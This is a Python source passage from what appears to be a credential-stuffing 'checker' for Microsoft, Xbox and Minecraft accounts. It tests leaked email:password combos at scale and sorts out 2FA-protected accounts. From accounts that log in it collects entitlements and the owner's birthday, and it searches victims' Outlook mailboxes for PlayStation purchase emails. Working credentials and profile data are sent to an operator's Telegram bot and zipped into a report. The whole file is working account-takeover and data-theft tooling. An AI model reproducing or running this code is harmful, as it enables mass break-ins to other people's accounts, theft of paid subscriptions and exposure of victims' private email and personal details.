    for attempt in range(MAX_RETRIES):
        try:
            response = session.get(SFTAG_URL, timeout=REQUEST_TIMEOUT)
            text = response.text
            match = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            if match:
                sftag = match.group(1)
                match = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
                if match:
                    return match.group(1), sftag
        except:
            pass
        time.sleep(0.5)
    return None, None

def microsoft_auth(session, email, password, url_post, sftag):
    for attempt in range(MAX_RETRIES):
        try:
            data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sftag}
            login_request = session.post(url_post, data=data,
                                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                                        allow_redirects=True, timeout=REQUEST_TIMEOUT)
            if '#' in login_request.url and login_request.url != SFTAG_URL:
                token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ["None"])[0]
                if token != "None":
                    return token, "success"
            elif 'cancel?mkt=' in login_request.text:
                try:
                    d = {
                        'ipt': re.search('(?<=\"ipt\" value=\").+?(?=\">)', login_request.text).group(),
                        'pprid': re.search('(?<=\"pprid\" value=\").+?(?=\">)', login_request.text).group(),
                        'uaid': re.search('(?<=\"uaid\" value=\").+?(?=\">)', login_request.text).group()
                    }
                    action_url = re.search('(?<=id=\"fmHF\" action=\").+?(?=\" )', login_request.text).group()
                    ret = session.post(action_url, data=d, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    return_url = re.search('(?<=\"recoveryCancel\":{\"returnUrl\":\").+?(?=\",)', ret.text).group()
                    fin = session.get(return_url, allow_redirects=True, timeout=REQUEST_TIMEOUT)
                    token = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                    if token != "None":
                        return token, "success"
                except:
                    pass
            elif any(v in login_request.text for v in ["recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "/Abuse?mkt="]):
                return None, "2fa"
            elif any(v in login_request.text.lower() for v in ["password is incorrect", "account doesn't exist", "sign in to your microsoft account", "tried to sign in too many times"]):
                return None, "bad"
        except Exception as e:
            debug_print(f"Auth error: {e}")
            if attempt == MAX_RETRIES - 1:
                return None, "error"
        time.sleep(0.5)
    return None, "error"

def get_xbox_token(session, ms_token):
    for attempt in range(MAX_RETRIES):
        try:
            payload = {
                "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"
            }
            response = session.post('https://user.auth.xboxlive.com/user/authenticate',
                                   json=payload,
                                   headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                xbox_token = data.get('Token')
                if xbox_token:
                    return xbox_token, data['DisplayClaims']['xui'][0]['uhs']
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception as e:
            debug_print(f"Xbox token error: {e}")
            if attempt == MAX_RETRIES - 1:
                return None, None
        time.sleep(0.5)
    return None, None

def get_xsts_token(session, xbox_token):
    for attempt in range(MAX_RETRIES):
        try:
            payload = {
                "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"
            }
            response = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                   json=payload,
                                   headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                return response.json().get('Token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception as e:
            debug_print(f"XSTS token error: {e}")
            if attempt == MAX_RETRIES - 1:
                return None
        time.sleep(0.5)
    return None

def get_minecraft_token(session, uhs, xsts_token):
    for attempt in range(MAX_RETRIES):
        try:
            response = session.post('https://api.minecraftservices.com/authentication/login_with_xbox',
                                   json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"},
                                   headers={'Content-Type': 'application/json'},
                                   timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                return response.json().get('access_token')
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except Exception as e:
            debug_print(f"Minecraft token error: {e}")
            if attempt == MAX_RETRIES - 1:
                return None
        time.sleep(0.5)
    return None

def get_entitlements(session, mc_token):
    entitlements = []
    for attempt in range(MAX_RETRIES):
        try:
            response = session.get('https://api.minecraftservices.com/entitlements/mcstore',
                                  headers={'Authorization': f'Bearer {mc_token}'},
                                  timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                text = response.text
                if 'product_game_pass_ultimate' in text:
                    entitlements.append('Xbox Game Pass Ultimate')
                if 'product_game_pass_pc' in text:
                    entitlements.append('Xbox Game Pass for PC')
                if 'product_minecraft' in text:
                    entitlements.append('Minecraft Java')
                if 'product_minecraft_bedrock' in text:
                    entitlements.append('Minecraft Bedrock')
                if 'product_dungeons' in text:
                    entitlements.append('Minecraft Dungeons')
                if 'product_legends' in text:
                    entitlements.append('Minecraft Legends')
                return entitlements
            elif response.status_code == 429:
                time.sleep(2)
                continue
        except:
            pass
        time.sleep(0.5)
    return entitlements

def get_minecraft_profile(session, mc_token):
    for attempt in range(MAX_RETRIES):
        try:
            response = session.get('https://api.minecraftservices.com/minecraft/profile',
                                  headers={'Authorization': f'Bearer {mc_token}'},
                                  timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                data = response.json()
                return {
                    'name': data.get('name', 'N/A'),
                    'uuid': data.get('id', 'N/A'),
                    'capes': [c['alias'] for c in data.get('capes', [])]
                }
            elif response.status_code == 404:
                return {'name': 'Not Set', 'uuid': 'N/A', 'capes': []}
        except:
            pass
        time.sleep(0.5)
    return None

def get_xbox_profile(session, uhs, xsts_token):
    for attempt in range(MAX_RETRIES):
        try:
            auth_header = f"XBL3.0 x={uhs};{xsts_token}"
            response = session.get(
                "https://profile.xboxlive.com/users/me/profile/settings"
                "?settings=Gamertag,GameDisplayPicRaw,AccountTier,XboxOneRep",
                headers={
                    "Authorization": auth_header,
                    "x-xbl-contract-version": "2",
                    "Accept": "application/json",
                    "Accept-Language": "en-US",
                },
                timeout=REQUEST_TIMEOUT
            )
            if response.status_code == 200:
                data = response.json()
                settings = {
                    s["id"]: s.get("value", "N/A")
                    for s in data.get("profileUsers", [{}])[0].get("settings", [])
                }
                return {
                    "gamertag": settings.get("Gamertag", "N/A"),
                    "gamerpic": settings.get("GameDisplayPicRaw", ""),
                    "tier": settings.get("AccountTier", "N/A"),
                    "rep": settings.get("XboxOneRep", "N/A"),
                }
        except:
            pass
        time.sleep(0.5)
    return {"gamertag": "N/A", "gamerpic": "", "tier": "N/A", "rep": "N/A"}

# ═══════════════════════════════════════════════════════════════════
# PSN CHECKER
# ═══════════════════════════════════════════════════════════════════

def get_birthday(access_token, cid):
    try:
        headers = {
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Authorization': f'Bearer {access_token}',
            'X-AnchorMailbox': f'CID:{cid}'
        }
        session = requests.Session()
        r = session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", headers=headers, timeout=15)
        if r.status_code == 200:
            data = r.json()
            birthday = data.get('birthday') or data.get('birthDate') or data.get('dateOfBirth')
            if birthday:
                try:
                    date_str = birthday.split('T')[0]
                    birth_date = datetime.strptime(date_str, '%Y-%m-%d')
                    today = datetime.now()
                    age = today.year - birth_date.year - ((today.month, today.day) < (birth_date.month, birth_date.day))
                    return birth_date.strftime('%Y-%m-%d'), age
                except:
                    return str(birthday), 'Unknown'
        return 'Unknown', 'Unknown'
    except:
        return 'Unknown', 'Unknown'

def check_psn_purchases(access_token, cid):
    try:
        purchase_senders = [
            "sony@txn-email.playstation.com", "sony@email02.account.sony.com",
            "no-reply@playstation.com", "playstation@email.playstation.com",
            "sony@playstation.com", "playstation@playstation.com",
            "Sony Interactive Entertainment", "playstation store", "psn purchase"
        ]
        
        query_string = " OR ".join([f'from:"{sender}"' if '@' in sender else sender for sender in purchase_senders])
        
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                "From": 0,
                "Query": {"QueryString": query_string},
                "Size": 50,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
            }]
        }
        
        headers = {
            'User-Agent': 'Outlook-Android/2.0',
            'Accept': 'application/json',
            'Authorization': f'Bearer {access_token}',
            'X-AnchorMailbox': f'CID:{cid}',
            'Content-Type': 'application/json'
        }
        
        session = requests.Session()
        r = session.post("https://outlook.live.com/search/api/v2/query", json=payload, headers=headers, timeout=15)
        
        if r.status_code == 200:
            data = r.json()
            purchases = []
            total_orders = 0
            
            if 'EntitySets' in data and len(data['EntitySets']) > 0:
                entity_set = data['EntitySets'][0]
                if 'ResultSets' in entity_set and len(entity_set['ResultSets']) > 0:
                    result_set = entity_set['ResultSets'][0]
                    if 'Results' in result_set:
                        for result in result_set['Results']:
                            email_date = None
                            if 'ReceivedTime' in result:
                                try:
                                    date_str = result['ReceivedTime']
                                    date_obj = datetime.fromisoformat(date_str.replace('Z', '+00:00'))
                                    if YEAR_FILTER != 0 and date_obj.year < YEAR_FILTER:
                                        continue
                                    email_date = date_obj
                                except:
                                    pass
                            
                            purchase = {'date': email_date.strftime('%Y-%m-%d') if email_date else 'Unknown'}
                            
                            if 'Preview' in result:
                                preview = result['Preview']
                                patterns = [
                                    r'Thank you for purchasing\s+([^\.]+)',
                                    r'You\'ve bought\s+([^\.]+)',
                                    r'purchased\s+([^\.]+)',
                                    r'Game:\s*([^\n]+)',
                                ]
                                for pattern in patterns:
                                    match = re.search(pattern, preview, re.IGNORECASE)
                                    if match:
                                        purchase['item'] = match.group(1).strip()[:50]
                                        break
                                
                                price_match = re.search(r'[\$€£¥]\s*(\d+[\.,]\d{2})', preview)
                                if price_match:
                                    purchase['price'] = price_match.group(0)
                            
                            if purchase.get('item') or email_date:
                                purchases.append(purchase)
                                total_orders += 1
            
            return total_orders, purchases
        return 0, []
    except:
        return 0, []

# ═══════════════════════════════════════════════════════════════════
# MAIN CHECK FUNCTION
# ═══════════════════════════════════════════════════════════════════

def check_account(combo):
    global hit_counter
    try:
        parts = combo.strip().split(':')
        if len(parts) < 2:
            with stats.lock:
                stats.bad += 1
                stats.checked += 1
            return
        
        email = parts[0]
        password = ':'.join(parts[1:])
        
        with stats.lock:
            stats.current_email = email
        
        session = requests.Session()
        session.verify = False
        
        url_post, sftag = get_sftag(session)
        if not url_post or not sftag:
            with stats.lock:
                stats.bad += 1
                stats.checked += 1
            return
        
        ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
        
        if auth_status == "2fa":
            with stats.lock:
                stats.twofa += 1
                stats.checked += 1
            save_2fa(email, password)
            return
        elif auth_status == "bad":
            with stats.lock:
                stats.bad += 1
                stats.checked += 1
            return
        elif auth_status != "success" or not ms_token:
            with stats.lock:
                stats.bad += 1
                stats.checked += 1
            return
        
        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            with stats.lock:
                stats.bad += 1
                stats.checked += 1
            return
        
        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            with stats.lock:
                stats.bad += 1
                stats.checked += 1
            return
        
        xbox_profile = get_xbox_profile(session, uhs, xsts_token)
        gamertag = xbox_profile.get('gamertag', 'N/A')
        
        mc_token = get_minecraft_token(session, uhs, xsts_token)
        mc_profile = None
        entitlements = []
        
        if mc_token:
            entitlements = get_entitlements(session, mc_token)
            mc_profile = get_minecraft_profile(session, mc_token)
        
        cid_match = re.search(r'cid=([A-F0-9-]+)', ms_token) if ms_token else None
        cid = cid_match.group(1) if cid_match else ""
        
        birthday, age = get_birthday(ms_token, cid) if ms_token else ('Unknown', 'Unknown')
        psn_orders, psn_purchases = check_psn_purchases(ms_token, cid) if ms_token else (0, [])
        
        # Check if premium
        is_premium = False
        subscriptions = []
        ultimate = False
        minecraft_java = False
        
        for ent in entitlements:
            if 'Ultimate' in ent:
                ultimate = True
                is_premium = True
                subscriptions.append(ent)
            elif 'Game Pass' in ent:
                subscriptions.append(ent)
            elif 'Minecraft Java' in ent:
                minecraft_java = True
                is_premium = True
                subscriptions.append(ent)
            elif 'Office' in ent or '365' in ent:
                subscriptions.append(ent)
                is_premium = True
            else:
                subscriptions.append(ent)
        
        if psn_orders > 0:
            is_premium = True
        
        # Update stats
        category_data = {
            'psn_hits': psn_orders > 0,
            'psn_orders': psn_orders,
            'ultimate': ultimate,
            'minecraft_java': minecraft_java,
            'office': 'Office 365' in subscriptions,
            'premium': is_premium
        }
        
        with stats.lock:
            stats.valid += 1
            stats.checked += 1
            if psn_orders > 0:
                stats.psn_hits += 1
                stats.psn_orders += psn_orders
            if ultimate:
                stats.ultimate += 1
            if minecraft_java:
                stats.minecraft_java += 1
            if 'Office 365' in subscriptions:
                stats.office += 1
            if is_premium:
                stats.premium += 1
        
        # Save results
        if is_premium:
            save_premium_hit(email, password, subscriptions, gamertag, ultimate, minecraft_java, psn_orders)
            
            detailed_data = {
                'birthday': birthday,
                'age': age,
                'subscriptions': subscriptions,
                'xbox_profile': xbox_profile,
                'minecraft_profile': mc_profile,
                'psn_orders': psn_orders,
                'psn_purchases': psn_purchases[:5]
            }
            save_detailed(email, password, detailed_data, is_premium=True)
            
            # Send Telegram hit
            with hit_counter_lock:
                hit_counter += 1
                send_telegram_hit(hit_counter, email, password, gamertag, ultimate, minecraft_java, psn_orders, subscriptions)
        else:
            save_valid(email, password)
        
        # Print hit line
        hit_line = f"{Fore.GREEN}[+] {email}{Style.RESET_ALL}"
        if ultimate:
            hit_line += f" {Fore.MAGENTA}(Ultimate){Style.RESET_ALL}"
        if minecraft_java:
            hit_line += f" {Fore.GREEN}(Minecraft){Style.RESET_ALL}"
        if psn_orders > 0:
            hit_line += f" {Fore.BLUE}(PSN: {psn_orders}){Style.RESET_ALL}"
        print(hit_line)
        
        # Update Telegram stats every 10 checks
        update_telegram_stats()
        
    except Exception as e:
        debug_print(f"Error checking {combo}: {e}")
        with stats.lock:
            stats.bad += 1
            stats.checked += 1

# ═══════════════════════════════════════════════════════════════════
# MAIN FUNCTION
# ═══════════════════════════════════════════════════════════════════

def main():
    global bot, THREADS, YEAR_FILTER, hit_counter
    
    # Welcome screen
    welcome_screen()
    
    # Load or setup config
    load_config()
    
    if not BOT_TOKEN or not CHAT_ID:
        print(f"  {Fore.YELLOW}⚠ Telegram not configured. You can set it up now.{Style.RESET_ALL}")
        setup_config()
    else:
        print(f"  {Fore.GREEN}✓{Fore.RESET} Config loaded.")
        reuse = linux_style_prompt("Use saved config? (y/n)").strip().lower()
        if reuse != 'y':
            setup_config()
    
    # Initialize bot
    bot = TelegramBot(BOT_TOKEN, CHAT_ID)
    
    # Get combo file
    combo_file = linux_style_prompt("Enter combo file path").strip().strip('"')
    
    if not os.path.exists(combo_file):
        print(f"  {Fore.RED}✗{Fore.RESET} File not found: {combo_file}")
        return
    
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if line.strip() and ':' in line]
    
    total = len(combos)
    if total == 0:
        print(f"  {Fore.RED}✗{Fore.RESET} No valid combos found!")
        return
    
    stats.total = total
    
    print(f"\n  {Fore.GREEN}✓{Fore.RESET} Loaded {total:,} combos")
    print(f"  {Fore.CYAN}✓{Fore.RESET} Threads: {THREADS}")
    print(f"  {Fore.CYAN}✓{Fore.RESET} PSN Filter: {'All' if YEAR_FILTER == 0 else YEAR_FILTER}")
    print(f"  {Fore.CYAN}✓{Fore.RESET} Results will be saved to: {base_folder}\n")
    
    # Send initial stats message to Telegram
    if bot.enabled:
        initial_msg = stats.get_stats_text().replace("LIVE", "STARTING")
        bot.send_stats_message(initial_msg)
        print(f"  {Fore.GREEN}✓{Fore.RESET} Telegram stats message sent!\n")
    
    input(f"  {Fore.GREEN}▶{Fore.RESET} Press ENTER to start checking...")
    
    # Start display thread
    stop_event = threading.Event()
    def display_loop():
        while not stop_event.is_set():
            print_live_table()
            time.sleep(0.5)
    
    disp = threading.Thread(target=display_loop, daemon=True)
    disp.start()
    
    # Start checking
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = [executor.submit(check_account, combo) for combo in combos]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except:
                pass
    
    stop_event.set()
    disp.join(timeout=1)
    
    # Final table
    print_live_table()
    
    # Save summary
    with open(files["summary"], 'w', encoding='utf-8') as f:
        f.write(f"Murphy Checker Summary\n")
        f.write(f"{'='*50}\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total: {stats.total}\n")
        f.write(f"Valid: {stats.valid}\n")
        f.write(f"Premium: {stats.premium}\n")
        f.write(f"PSN Hits: {stats.psn_hits}\n")
        f.write(f"PSN Orders: {stats.psn_orders}\n")
        f.write(f"Ultimate: {stats.ultimate}\n")
        f.write(f"Minecraft Java: {stats.minecraft_java}\n")
        f.write(f"Office 365: {stats.office}\n")
        f.write(f"CPM: {stats.get_cpm()}\n")
        f.write(f"Time: {stats.get_elapsed()}\n")
    
    print(f"\n  {Fore.GREEN}✓{Fore.RESET} Checking complete!")
    print(f"  {Fore.CYAN}📁{Fore.RESET} Results saved to: {base_folder}")
    
    # Create and send ZIP report
    if bot.enabled:
        print(f"  {Fore.YELLOW}📦{Fore.RESET} Creating ZIP report...")
        zip_path = create_zip_report()
        print(f"  {Fore.GREEN}✓{Fore.RESET} ZIP created")
        
        print(f"  {Fore.YELLOW}📤{Fore.RESET} Sending final report to Telegram...")
        send_telegram_final_report(zip_path)
        print(f"  {Fore.GREEN}✓{Fore.RESET} Final report sent!")
    
    input(f"\n  {Fore.CYAN}Press Enter to exit...{Fore.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n  {Fore.RED}✗{Fore.RESET} Stopped by user")
    except Exception as e:
        print(f"\n  {Fore.RED}✗{Fore.RESET} Fatal error: {e}")